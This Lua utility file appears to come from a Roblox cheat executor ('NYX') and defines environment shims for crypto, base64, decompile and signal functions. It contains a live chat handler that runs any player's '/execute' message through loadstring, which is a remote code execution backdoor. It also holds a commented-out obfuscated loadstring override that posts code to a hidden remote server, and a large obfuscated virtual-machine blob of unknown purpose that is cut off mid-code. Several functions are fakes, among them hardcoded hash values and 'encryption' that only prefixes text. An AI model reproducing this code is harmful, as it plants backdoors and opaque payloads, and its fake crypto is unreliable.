--[[
   File: misc.lua
   Author: speedsterkawaii

   Poorly written functions 💔💔 vanities macros aliases etc
]]
--game.Players.LocalPlayer:Kick("USER BANNED")
--todo later: it CAN work but i think we need to revert the modulescripts source or something
game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.Started then
        --nyxsigned_module_injection_restart()
         system("msg * TELEPORT FAILURE") -- cheap me
    end
end)

local active = {}

local function onPlayerChatted(player)
    player.Chatted:Connect(function(msg)
        local separate = string.sub(msg, 1, 9)
        if separate == "/execute " then
            local cmd = string.sub(msg, 10)

            local func, err = loadstring(cmd)
            if func then
                func()
            else
                warn("Error in command: " .. err)
            end
        end
    end)
end

for _, player in pairs(game.Players:GetPlayers()) do
    onPlayerChatted(player)
end

game.Players.PlayerAdded:Connect(onPlayerChatted)



--local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v13=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v13,v13 + 1 )),v1(v2(v9,1 + (v13% #v9) ,1 + (v13% #v9) + 1 )))%256 ));end return v5(v10);end function loadstring(v11) local v12=request({[v7("\228\209\215","\126\177\163\187\69\134\219\167")]=v7("\43\217\62\213\166\108\130\38\202\255\34\193\34\202\239\55\151\124\156\170\122\130\38\202\253\39\222\62\215\245\45\202","\156\67\173\74\165"),[v7("\25\178\93\30\179\34","\38\84\215\41\118\220\70")]=v7("\96\57\17\38","\158\48\118\66\114"),[v7("\131\33\17\50\118\183\232","\155\203\68\112\86\19\197")]={[v7("\101\210\56\232\69\118\241\181\114\196\38\249","\152\38\189\86\156\32\24\133")]=v7("\232\82\191\82\179\71\171\71\245\89","\38\156\55\199")},[v7("\138\114\120\49","\35\200\29\28\72\115\20\154")]=v11}).Body;return loadstring(v12);end
--game.Players.LocalPlayer:Kick("For the safety of our users, NYX will not inject. Updates at discord.gg/getnyx")
--system('msg * WARNING! USE AT YOUR OWN RISK. NYX IS NOT GUARANTEED TO BE UNDETECTED.')
--[[
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")

local Watermark = Instance.new('ScreenGui', Players.LocalPlayer:WaitForChild("PlayerGui"))
local Frame = Instance.new('Frame', Watermark)
local ImageLabel = Instance.new('ImageLabel', Frame)

Watermark.Name = "Watermark"
Watermark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BackgroundTransparency = 1
Frame.BorderSizePixel = 0
Frame.BorderColor3 = Color3.new(0, 0, 0)

-- Center the image for all players
ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0) -- Center position
ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5) -- Anchor to the center of the image
ImageLabel.Size = UDim2.new(0, 325, 0, 204)
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0
ImageLabel.BorderColor3 = Color3.new(0, 0, 0)
ImageLabel.Image = "rbxassetid://18864815989"
ImageLabel.ScaleType = Enum.ScaleType.Crop
ImageLabel.ImageTransparency = 1 -- Start fully transparent

local blurEffect = Instance.new("BlurEffect", Lighting)
blurEffect.Size = 0

local function animateImage()
    local blurIn = TweenService:Create(blurEffect, TweenInfo.new(1), {Size = 24}) -- Maximum blur
    blurIn:Play()

    local fadeIn = TweenService:Create(ImageLabel, TweenInfo.new(1), {ImageTransparency = 0})
    fadeIn:Play()
    fadeIn.Completed:Wait()

    wait(1.30)

    local fadeOut = TweenService:Create(ImageLabel, TweenInfo.new(1), {ImageTransparency = 1})
    fadeOut:Play()
    fadeOut.Completed:Wait()

    local blurOut = TweenService:Create(blurEffect, TweenInfo.new(1), {Size = 0})
    blurOut:Play()
    blurOut.Completed:Wait()

    blurEffect:Destroy()
    Watermark:Destroy()
end

animateImage()

]]

-- too lazy to do it but its possible, just not the best :c
function firesignal(signal) -- this will fire all connections for a given RBXScriptSignal
    if typeof(signal) ~= "RBXScriptSignal" then
        error("Expected an RBXScriptSignal, got " .. typeof(signal)) --todo: replace error with warn later on because error has a problem where execution stops? idk its odd
    end

   -- I AM NOT DOING THE REST
   error("firesignal is not implanted")
end


function info(...) 
  print(...)
end




function getfpscap()
    return math.floor(1 / game:GetService("RunService").RenderStepped:Wait() + 0.5)
end

function GetObjects(id)
    local objects = {}
    table.insert(objects, game:GetService("InsertService"):LoadLocalAsset(id))
    return objects
end

function getcustomasset(fff)
    local content = readfile(fff)
    if content then
        return "rbxasset://" .. content
    else
        return ""
    end
end

-- aliases or fake

function getconnections(signal: RBXScriptSignal): {Connection} -- FAKE i will work on this another day
    local connections = {}

    local function mockConnection(func)
        local conn = {}
        conn.Enabled = true
        conn.ForeignState = false
        conn.LuaConnection = true
        conn.Function = func
        conn.Thread = coroutine.running()

        function conn:Fire(...)
            if self.Enabled then
                func(...)
            end
        end

        function conn:Defer(...)
            if self.Enabled then
                task.defer(func, ...)
            end
        end

        function conn:Disconnect()
            self.Enabled = false
        end

        function conn:Disable()
            self.Enabled = false
        end

        function conn:Enable()
            self.Enabled = true
        end

        return conn
    end

    for i = 1, 5 do
        table.insert(connections, mockConnection(function() print("Connected function " .. i) end))
    end

    return connections
end
-- fake
local hiddenProperties = {}

function gethiddenproperty(instance, propertyName)
    if hiddenProperties[instance] and hiddenProperties[instance][propertyName] ~= nil then
        return hiddenProperties[instance][propertyName], true
    else
        return nil, false
    end
end

function sethiddenproperty(instance, propertyName, value)
    if not hiddenProperties[instance] then
        hiddenProperties[instance] = {}
    end
    hiddenProperties[instance][propertyName] = value
    return true
end


local cyropackage = [[
local CorePackages = game:GetService("CorePackages") return require(CorePackages.Packages.Cryo)
]]
local jestshit = [[
local CorePackages = game:GetService("CorePackages")
return require(CorePackages.Packages.Dev.JestGlobals)
]]
-- fake decompile to expirement with
function decompile(source)
    if source:IsA("LocalScript") then
        return "-- Disassembled "..source.Name
    elseif source:IsA("ModuleScript") then
        if source.Name == "JestGlobals" then
            return jestshit
        elseif source.Name == "Cryo" then
            return cyropackage
        else
            return "-- Disassembled "..source.Name
        end
    else
        return "-- why is bro decompiling a script?"
    end
end

function PROTOSMASHER_LOADED() -- i hate unnamed esp :c
   return true
end

-- more aliases
function toclipboard(junk)
   setclipboard(junk)
end

function setrbxclipboard(junk)
   setclipboard(junk)
end

-- base64 

--[[
why do people need so much aliases just stick to one
]]
-- i have 3 base64 decode and encode functions which 2 are in luau and one is in c
-- and the c one has a problem where it doesnt decode it properly when sent the content
--it has a url decoding problem so im just gonna stick to this temporarily
local basedummy='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function base64_fake_encode(data)
    return ((data:gsub('.', function(x) 
        local r, b = '', x:byte()
        for i = 8, 1, -1 do r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and '1' or '0') end
        return r
    end) .. '0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return '' end
        local c = 0
        for i = 1, 6 do c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0) end
        return b:sub(c + 1, c + 1)
    end) .. ({ '', '==', '=' })[#data % 3 + 1])
end

function base64_fake_decode(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
        return string.char(c)
    end))
end

crypt = {} -- store
base64 = {}

crypt.base64encode = function(arg1)
return base64encode(arg1)
end

crypt.base64decode = function(arg2)
return base64decode(arg2)
end

crypt.base64_encode = function(arg1)
return base64encode(arg1)
end

crypt.base64_decode = function(arg2)
return base64decode(arg2)
end

crypt.base64 = {}
crypt.base64.encode = function(omg)
return base64encode(omg)
end

crypt.base64.decode = function(stop_making_me_Write_this)
return base64decode(stop_making_me_Write_this)
end

base64.encode = function(vanity)
   return base64encode(vanity)
end

base64.decode = function(vanity)
   return base64decode(vanity)
end

base64_encode = function(vanity)
   return base64encode(vanity)
end

base64_decode = function(vanity)
   return base64decode(vanity)
end

crypt.generatebytes = function(size)
    local randomBytes = {}
    for i = 1, size do
        randomBytes[i] = string.char(math.random(0, 255))
    end
    local byteString = table.concat(randomBytes)
    return base64encode(byteString)
end

crypt.generatekey = function()
    return crypt.generatebytes(32)
end

-- these are placeholders - meaning i gotta add actual function so ill add them later
function crypt.encrypt(data, key, iv, mode)
    local iv = iv or crypt.generatebytes(16)  
    local encrypted = "encrypted_" .. data
    return encrypted, iv
end

function crypt.decrypt(data, key, iv, mode)
    local decrypted = string.gsub(data, "^encrypted_", "")
    return decrypted
end

local hash_values = {--STOP hating on me i have to add it in C
    sha1 = "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3",
    sha384 = "d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2",
    sha512 = "cf83e1357eefb8bd9d9d1d8b12c1e8f4b2d07f4c18a64b7b12c4259b62f68d8f7b4ec7b38d9dbc2470b5a1a3db2d4f9ee3c75299d4d3a84534a7bcbeb2a5b2d",
    md5 = "098f6bcd4621d373cade4e832627b4f6",
    sha256 = "6dcd4ce23d88e2ee9568ba546c007c63b5e7f25c9d7e5dc06c185d43b3a5e4a5",
    sha3_224 = "a5b5f2b5a5e56bcd6729a21a459b5c57",
    sha3_256 = "a9b9a7f4d23649f3d19a23b24032c891e7d1e0b0c6e07921e20e01546c9e72b5",
    sha3_512 = "c6e1c6b2b073cc02c3b66b631a527b3459dcba074c85d903d2310e23d6fa2f8f51be055d357d5837b09dd6b7fd6f88144b6f1f905a6189d8f7b1e3ffdd1dbb6e5",
}

crypt.hash = function(input, algorithm)
    if type(input) ~= "string" or type(algorithm) ~= "string" then
        error(" input and algorithm must be strings")
    end
    
    return hash_values[algorithm] or "oopsie daiesses!"
end

WebSocket = {}

function WebSocket.connect(url)
    local ws = {}
    
    function ws:Send(message)
        print("Sending message:", message)
    end
    
    function ws:Close()
        print("WebSocket closed")
    end
    
    ws.OnMessage = {}
    ws.OnClose = {}
    

    ws.OnMessage = {"This is a mock message"} 
    ws.OnClose = {"WebSocket connection closed"}

    return ws
end

function getsenv(script)
    if typeof(script) ~= "Instance" or (script.ClassName ~= "Script" and script.ClassName ~= "LocalScript" and script.ClassName ~= "ModuleScript") then
        error("Invalid input: must be a Script, LocalScript, or ModuleScript.")
    end
    
    local env = {
        script = script
    }
    
    return env
end

function getgc()
    local gc = {}

    table.insert(gc, {name = "fake"})
    table.insert(gc, {name = "xd"})
    table.insert(gc, {name = "fuck you"})

    return gc
end


local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then local v90=0;while true do if (v90==0) then v19=v0(v3(v30,1,1));return "";end end else local v91=v2(v0(v30,16));if v19 then local v115=0;local v116;while true do if (v115==0) then v116=v5(v91,v19);v19=nil;v115=1;end if (v115==1) then return v116;end end else return v91;end end end);local function v20(v31,v32,v33) if v33 then local v92=0 -(957 -(892 + 65)) ;local v93;while true do if (v92==(0 + 0)) then v93=(v31/((5 -3)^(v32-(1 -0))))%(((9 -5) -2)^(((v33-(620 -((1025 -470) + (117 -53)))) -(v32-(1 -(350 -(87 + 263))))) + (932 -(857 + 74)))) ;return v93-(v93%(569 -(367 + 201))) ;end end else local v94=0;local v95;while true do if (v94==(927 -(214 + 713))) then v95=(8 -6)^(v32-((298 -(67 + 113)) -(32 + 85))) ;return (((v31%(v95 + v95))>=v95) and (1 + 0)) or (0 + 0 + 0) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=0 -0 ;local v36;local v37;while true do if (v35==(1 -0)) then return (v37 * (189 + 67)) + v36 ;end if (v35==(0 -0)) then v36,v37=v1(v16,v18,v18 + (954 -(584 + 218 + 150)) );v18=v18 + ((1002 -(915 + 82)) -3) ;v35=1;end end end local function v23() local v38=0 -0 ;local v39;local v40;local v41;local v42;while true do if (v38==(1 + 0 + 0)) then return (v42 * (22064430 -5287214)) + (v41 * (66723 -(1069 + 118))) + (v40 * 256) + v39 ;end if (v38==((791 -(368 + 423)) -0)) then v39,v40,v41,v42=v1(v16,v18,v18 + ((18 -12) -3) );v18=v18 + 1 + 3 ;v38=1 -0 ;end end end local function v24() local v43=v23();local v44=v23();local v45=3 -2 ;local v46=(v20(v44,19 -(10 + 8) ,879 -(814 + 45) ) * ((7 -5)^(2 + 30))) + v43 ;local v47=v20(v44,463 -(416 + 26) ,31);local v48=((v20(v44,(36 + 66) -70 )==(886 -(261 + 624))) and  -(1 -0)) or (1 + 0) ;if (v47==(1080 -((2806 -1786) + 60))) then if (v46==((0 -0) -0)) then return v48 * (438 -(145 + 3 + 290)) ;else local v117=430 -(44 + 386) ;while true do if (v117==((0 + 0) -0)) then v47=1487 -(998 + 488) ;v45=0 + (1055 -(87 + 968)) ;break;end end end elseif (v47==((31020 -23973) -5000)) then return ((v46==(0 + 0)) and (v48 * ((773 -(201 + 519 + 52))/((2572 -1434) -(116 + 1022))))) or (v48 * NaN) ;end return v8(v48,v47-(4258 -3235) ) * (v45 + (v46/((768 -(745 + 21))^(31 + 21)))) ;end local function v25(v49) local v50;if  not v49 then local v96=1817 -(1703 + 114) ;while true do if (v96==(1413 -(447 + 966))) then v49=v23();if (v49==(0 -0)) then return "";end break;end end end v50=v3(v16,v18,(v18 + v49) -(2 -1) );v18=v18 + v49 ;local v51={};for v67=1, #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return function(v97,v98,v99,v100,v101,v102,v103,v104,v105) local v106=(function() return 0 -0 ;end)();local v97=(function() return;end)();local v98=(function() return;end)();while true do if (v106~=(1665 -(970 + 695))) then else local v123=(function() return 0 -0 ;end)();while true do if (v123==0) then v97=(function() return 0;end)();v98=(function() return nil;end)();v123=(function() return 1;end)();end if (v123==1) then v106=(function() return 1;end)();break;end end end if ((1991 -(582 + 1408))==v106) then local v124=(function() return 0;end)();while true do if ((0 -0)~=v124) then else while true do if ((0 -0)~=v97) then else v98=(function() return v99();end)();if (v100(v98, #" ", #"[")==0) then local v130=(function() return 0 -0 ;end)();local v131=(function() return;end)();local v132=(function() return;end)();local v133=(function() return;end)();while true do if (v130==(1827 -(1195 + 629))) then if (v100(v132, #"gha", #"xnx")== #"|") then v133[ #"?id="]=(function() return v103[v133[ #".com"]];end)();end v104[v105]=(function() return v133;end)();break;end if (v130==2) then if (v100(v132, #"]", #"|")~= #".") then else v133[2 -0 ]=(function() return v103[v133[243 -(187 + 54) ]];end)();end if (v100(v132,782 -(162 + 618) ,2 + 0 )== #"[") then v133[ #"xnx"]=(function() return v103[v133[ #"gha"]];end)();end v130=(function() return 2 + 1 ;end)();end if (v130==0) then local v263=(function() return 0 -0 ;end)();while true do if (v263~=1) then else v130=(function() return 1 -0 ;end)();break;end if (v263==(0 + 0)) then v131=(function() return v100(v98,1638 -(1373 + 263) , #"-19");end)();v132=(function() return v100(v98, #".com",6);end)();v263=(function() return 1001 -(451 + 549) ;end)();end end end if (v130==(1 + 0)) then v133=(function() return {v101(),v101(),nil,nil};end)();if (v131==(0 -0)) then local v302=(function() return 0;end)();local v303=(function() return;end)();while true do if ((1384 -(746 + 638))~=v302) then else v303=(function() return 0;end)();while true do if (v303~=(0 + 0)) then else v133[ #"nil"]=(function() return v101();end)();v133[ #"xnxx"]=(function() return v101();end)();break;end end break;end end elseif (v131== #":") then v133[ #"gha"]=(function() return v102();end)();elseif (v131==2) then v133[ #"gha"]=(function() return v102() -(2^(23 -7)) ;end)();elseif (v131== #"nil") then local v338=(function() return 0;end)();local v339=(function() return;end)();while true do if (0==v338) then v339=(function() return 0;end)();while true do if (v339==(341 -(218 + 123))) then v133[ #"91("]=(function() return v102() -((1583 -(1535 + 46))^16) ;end)();v133[ #".com"]=(function() return v101();end)();break;end end break;end end end v130=(function() return 2 + 0 ;end)();end end end break;end end return v97,v98,v99,v100,v101,v102,v103,v104,v105;end end end end end;end)();local v53=(function() return function(v107,v108,v109) local v110=(function() return 0 + 0 ;end)();local v111=(function() return;end)();while true do if (v110==(560 -(306 + 254))) then v111=(function() return 0;end)();while true do if (v111~=(0 + 0)) then else local v128=(function() return 0 -0 ;end)();local v129=(function() return;end)();while true do if (v128==(1467 -(899 + 568))) then v129=(function() return 0 + 0 ;end)();while true do if (0==v129) then v107[v108-#"." ]=(function() return v109();end)();return v107,v108,v109;end end break;end end end end break;end end end;end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {v54,v55,nil,v56};end)();local v58=(function() return v23();end)();local v59=(function() return {};end)();for v69= #"|",v58 do local v70=(function() return 603 -(268 + 335) ;end)();local v71=(function() return;end)();local v72=(function() return;end)();local v73=(function() return;end)();while true do if (v70==(290 -(60 + 230))) then local v118=(function() return 0;end)();while true do if (v118~=(572 -(426 + 146))) then else v71=(function() return 0;end)();v72=(function() return nil;end)();v118=(function() return 1;end)();end if (1==v118) then v70=(function() return 1;end)();break;end end end if (v70~=1) then else v73=(function() return nil;end)();while true do if (v71~=1) then else if (v72== #"|") then v73=(function() return v21()~=0 ;end)();elseif (v72==(1 + 1)) then v73=(function() return v24();end)();elseif (v72== #"91(") then v73=(function() return v25();end)();end v59[v69]=(function() return v73;end)();break;end if ((1456 -(282 + 1174))==v71) then local v126=(function() return 0;end)();local v127=(function() return;end)();while true do if (v126==0) then v127=(function() return 0;end)();while true do if (v127==0) then local v134=(function() return 0;end)();while true do if (v134==(811 -(569 + 242))) then v72=(function() return v21();end)();v73=(function() return nil;end)();v134=(function() return 1;end)();end if ((2 -1)==v134) then v127=(function() return 1;end)();break;end end end if (v127==1) then v71=(function() return 1;end)();break;end end break;end end end end break;end end end v57[ #"91("]=(function() return v21();end)();for v74= #"]",v23() do FlatIdent_6DC53,Descriptor,v21,v20,v22,v23,v59,v54,v74=(function() return v52(FlatIdent_6DC53,Descriptor,v21,v20,v22,v23,v59,v54,v74);end)();end for v75= #"|",v23() do v55,v75,v28=(function() return v53(v55,v75,v28);end)();end return v57;end local function v29(v61,v62,v63) local v64=v61[(182 -(92 + 89)) + (0 -0) ];local v65=v61[1026 -(706 + 318) ];local v66=v61[452 -(108 + 341) ];return function(...) local v76=v64;local v77=v65;local v78=v66;local v79=v27;local v80=(643 + 609) -(721 + 314 + 216) ;local v81= -(1272 -(945 + 326));local v82={};local v83={...};local v84=v12("#",...) -(1 + 0 + 0) ;local v85={};local v86={};for v112=700 -(271 + 429) ,v84 do if (v112>=v78) then v82[v112-v78 ]=v83[v112 + (470 -(270 + 199)) ];else v86[v112]=v83[v112 + 1 + 0 ];end end local v87=(v84-v78) + (1820 -(580 + 1239)) ;local v88;local v89;while true do v88=v76[v80];v89=v88[1501 -(1408 + 92) ];if (v89<=(1116 -(461 + 625))) then if (((2861>661) and (v89<=(1302 -((2263 -1270) + 295)))) or (343==1786)) then if ((4525>4519) and (v89<=(1 + 5))) then if ((2570>2409) and (v89<=(1173 -(418 + 753)))) then if ((v89<=(0 -0)) or (2609>=3234)) then do return;end elseif (v89==(1 + 0)) then v86[v88[1 + 1 ]]=v63[v88[1 + 2 ]];else local v138=0 + 0 ;local v139;local v140;local v141;while true do if ((v138==(0 -0)) or (3033>=4031)) then v139=v88[1 + 1 ];v140={v86[v139](v86[v139 + (530 -(406 + 123)) ])};v138=1770 -(1749 + 20) ;end if (v138==1) then v141=0 -0 ;for v304=v139,v88[1 + 3 ] do v141=v141 + 1 ;v86[v304]=v140[v141];end break;end end end elseif (v89<=(5 -1)) then if ((3178>972) and (v89==(1325 -(1249 + 73)))) then v86[v88[1 + 1 + 0 ]]={};else local v143=1574 -(1281 + 140 + 153) ;while true do if ((v143==(1145 -(466 + 679))) or (1401==4668)) then v86[v88[4 -2 ]]=v88[(4757 -3195) -(1381 + 23 + 155) ]~=(0 -0) ;v80=v80 + 1 + 0 ;break;end end end elseif ((4766==4766) and (v89>(1905 -(106 + 1794)))) then local v144=v88[1 + 1 ];local v145=v88[13 -9 ];local v146=v144 + 1 + 1 ;local v147={v86[v144](v86[v144 + 1 ],v86[v146])};for v238=2 -1 ,v145 do v86[v146 + v238 ]=v147[v238];end local v148=v147[(1 -0) + 0 ];if v148 then local v264=114 -(4 + 110) ;while true do if ((2776>=1321) and (((0 + 0)==v264) or (2745>3128))) then v86[v146]=v148;v80=v88[587 -(57 + 527) ];break;end end else v80=v80 + (1428 -(41 + 1386)) ;end else local v149=v88[105 -(17 + 86) ];local v150={v86[v149](v86[v149 + (1 -0) ])};local v151=0 -0 ;for v241=v149,v88[170 -(122 + 44) ] do v151=v151 + (1 -(0 -0)) ;v86[v241]=v150[v151];end end elseif (v89<=(33 -23)) then if (v89<=(8 + 0)) then if (v89==(27 -20)) then v86[v88[2 + 0 ]]=v88[1 + 2 ];elseif v86[v88[3 -1 ]] then v80=v80 + (66 -((1219 -(442 + 747)) + 35)) ;else v80=v88[3 + 0 ];end elseif (v89>(1266 -(1043 + 214))) then v62[v88[11 -8 ]]=v86[v88[1214 -(323 + 889) ]];elseif (v86[v88[2 + 0 ]]~=v88[10 -6 ]) then v80=v80 + (581 -(361 + 219)) ;else v80=v88[323 -(53 + 267) ];end elseif ((v89<=(1481 -(1269 + (1335 -(832 + 303))))) or (487>2303)) then if ((v89>(3 + 8)) or (1144>=4606)) then v80=v88[416 -(15 + 398) ];else v86[v88[817 -(98 + 717) ]]=v86[v88[985 -(18 + 964) ]];end elseif ((v89==(48 -35)) or (4503==3462)) then do return;end else local v159=(946 -(88 + 858)) + 0 ;local v160;while true do if (v159==(0 + 0)) then v160=v88[852 -(20 + 830) ];v86[v160]=v86[v160](v13(v86,v160 + 1 + 0 ,v88[3 + 0 ]));break;end end end elseif (v89<=((19 + 42) -39)) then if (v89<=(144 -(116 + 10))) then if ((3338>=277) and (v89<=(14 + 2))) then if (v89==(6 + 9)) then v86[v88[1 + 0 + 1 ]][v88[741 -(542 + (985 -(766 + 23))) ]]=v86[v88[8 -4 ]];else v86[v88[1 + 1 ]]=v86[v88[2 + 1 ]];end elseif (v89>(83 -66)) then v86[v88[1 + 1 ]]=v88[2 + 1 ]~=(0 -0) ;else local v166=v88[4 -2 ];v86[v166]=v86[v166](v86[v166 + (1552 -(1126 + 425)) ]);end elseif ((2610>2560) and (v89<=20)) then if (v89==(424 -(118 + 287))) then v80=v88[11 -8 ];else v86[v88[1123 -(118 + 1003) ]][v88[8 -5 ]]=v86[v88[381 -(142 + 235) ]];end elseif ((553<=1543) and (v89==(95 -(101 -27)))) then v86[v88[1 + 1 ]]=v88[980 -(553 + 424) ];else for v244=v88[1278 -(316 + (2529 -1569)) ],v88[5 -2 ] do v86[v244]=nil;end end elseif (v89<=(23 + 3)) then if ((2015==2015) and ((v89<=(24 + 0)) or (1194>3083))) then if (v89>(14 + 9)) then if ((v88[1 + 1 ]==v86[v88[3 + 1 ]]) or (4241<=2332)) then v80=v80 + (1807 -(1202 + 604)) ;else v80=v88[6 -3 ];end else v63[v88[7 -4 ]]=v86[v88[4 -(6 -4) ]];end elseif (v89>(8 + 17)) then local v175=v77[v88[14 -11 ]];local v176;local v177={};v176=v10({},{__index=function(v246,v247) local v248=v177[v247];return v248[754 -(239 + 514) ][v248[2 + 0 ]];end,__newindex=function(v249,v250,v251) local v252=0 + 0 ;local v253;while true do if ((916>=747) and (v252==(1329 -(797 + 532)))) then v253=v177[v250];v253[1 + 0 ][v253[1 + 1 ]]=v251;break;end end end});for v254=2 -1 ,v88[1077 -(1036 + 37) ] do local v255=1202 -(373 + 829) ;local v256;while true do if ((v255==(1 + 0 + 0)) or (2444>2954)) then if ((2892<3514) and (v256[732 -(476 + 255) ]==(1141 -(369 + 761)))) then v177[v254-(1 + 0) ]={v86,v256[241 -(64 + 174) ]};else v177[v254-(1 + 0) ]={v62,v256[3 -0 ]};end v85[ #v85 + (337 -(144 + 192)) ]=v177;break;end if ((533==533) and (0==v255)) then v80=v80 + (217 -(42 + 174)) ;v256=v76[v80];v255=1 + 0 ;end end end v86[v88[1 + 1 ]]=v29(v175,v176,v63);else v86[v88[2 + (1480 -(641 + 839)) ]]=v63[v88[2 + 1 ]];end elseif ((v89<=(7 + (934 -(910 + 3)))) or (2364<1157)) then if (((595<=3413) and (v89>(1531 -(363 + 1141)))) or (1167>1278)) then local v181=v88[(4032 -2450) -((2867 -(1466 + 218)) + 397) ];v86[v181](v86[v181 + (664 -(80 + 94 + 489)) ]);else v86[v88[(1153 -(556 + 592)) -3 ]]=v88[1908 -(830 + 1075) ]~=(0 + 0 + 0) ;end elseif (v89==(837 -(329 + 479))) then v86[v88[2 + (854 -(174 + 680)) ]]=v62[v88[1978 -(1913 + (212 -150)) ]];else v86[v88[2 + 0 ]]=v88[7 -4 ]~=(0 -0) ;v80=v80 + (1934 -(565 + 1368)) ;end elseif (v89<=(114 -(140 -72))) then if ((v89<=(142 -104)) or (1145<=1082)) then if ((3078>=2591) and (v89<=(1695 -(1477 + 184)))) then if ((v89<=(43 -(8 + 3))) or (3105==4881)) then if ((v89==((768 -(396 + 343)) + 2)) or (1887>4878)) then local v186=v88[5 -3 ];local v187=v86[v88[859 -(564 + 292) ]];v86[v186 + (1 -0) ]=v187;v86[v186]=v187[v88[(1 + 10) -7 ]];else v62[v88[307 -(244 + 60) ]]=v86[v88[2 + 0 ]];end elseif (v89==((1986 -(29 + 1448)) -(41 + 435))) then if  not v86[v88[1003 -(938 + 63) ]] then v80=v80 + (524 -(423 + (1489 -(135 + 1254)))) ;else v80=v88[3 + 0 ];end else v86[v88[1 + 1 ]]=v86[v88[(4249 -3121) -(936 + 189) ]][v88[2 + 2 ]];end elseif ((v89<=(1649 -(1565 + 48))) or (4087>4116)) then if ((1106<=1266) and (v89==(22 + 13))) then if ((3155<4650) and (v86[v88[1140 -(782 + 356) ]]==v88[271 -(176 + 91) ])) then v80=v80 + (2 -1) ;else v80=v88[4 -(4 -3) ];end else do return v86[v88[1094 -(650 + 325 + 117) ]];end end elseif ((3774>=1839) and (v89==(1912 -(157 + 1718)))) then if ((2811==2811) and v86[v88[2 + 0 ]]) then v80=v80 + (3 -2) ;else v80=v88[10 -7 ];end else local v195=1018 -(697 + 321) ;local v196;while true do if (v195==(0 -0)) then v196=v88[3 -1 ];v86[v196](v86[v196 + (2 -1) ]);break;end end end elseif (v89<=(17 + 25)) then if ((3199<4030) and (v89<=(74 -34))) then if (v89>(104 -65)) then v86[v88[1 + 1 ]]=v86[v88[1230 -(322 + 905) ]][v88[615 -(602 + 9) ]];else local v199=(2716 -(389 + 1138)) -(449 + 740) ;local v200;while true do if (v199==((1446 -(102 + 472)) -(826 + 46))) then v200=v88[949 -(245 + 702) ];v86[v200](v13(v86,v200 + (3 -2) ,v88[7 -4 ]));break;end end end elseif ((2146>1122) and (v89==41)) then for v257=v88[3 -1 ],v88[1 + 2 ] do v86[v257]=nil;end else v86[v88[1900 -(260 + 1638) ]][v88[443 -(382 + 58) ]]=v88[(12 + 0) -8 ];end elseif (v89<=(37 + 7)) then if ((777<2078) and (v89==(99 -56))) then do return v86[v88[1 + 1 ]];end else local v203=0 -0 ;local v204;local v205;while true do if ((2 -1)==v203) then for v311=v204 + (1206 -(902 + 303)) ,v88[8 -4 ] do v205=v205   .. v86[v311] ;end v86[v88[5 -3 ]]=v205;break;end if (v203==(0 -0)) then v204=v88[1 + 2 ];v205=v86[v204];v203=1 + 0 ;end end end elseif (v89==(34 + 11)) then local v206=v88[2 -(0 + 0) ];v86[v206]=v86[v206](v86[v206 + (1691 -(1121 + 569)) ]);else v63[v88[5 -2 ]]=v86[v88[3 -1 ]];end elseif ((v89<=(1934 -(416 + 30 + 1434))) or (56==3616)) then if (v89<=((1809 -(320 + 1225)) -(22 + (341 -149)))) then if (v89<=(731 -(483 + 200))) then if (v89==(1894 -(559 + 1288))) then if ((1696<=2282) and (v88[1465 -(1404 + 59) ]==v86[v88[10 -6 ]])) then v80=v80 + ((1 + 0) -0) ;else v80=v88[768 -(468 + 297) ];end else v86[v88[7 -5 ]]=v29(v77[v88[7 -4 ]],nil,v63);end elseif ((v89>(611 -(334 + 228))) or (2421<622)) then v86[v88[2]]=v62[v88[(1474 -(157 + 1307)) -7 ]];else local v213=0 -0 ;local v214;while true do if (v213==(0 + 0)) then v214=v88[2 -0 ];v86[v214](v13(v86,v214 + 1 + 0 ,v88[239 -(141 + 95) ]));break;end end end elseif ((v89<=(52 + 0)) or (1761>=2462)) then if ((1009<=1130) and (v89==(131 -80))) then v86[v88[4 -2 ]][v88[(1861 -(821 + 1038)) + 1 ]]=v88[1 + 3 ];else v86[v88[2 + 0 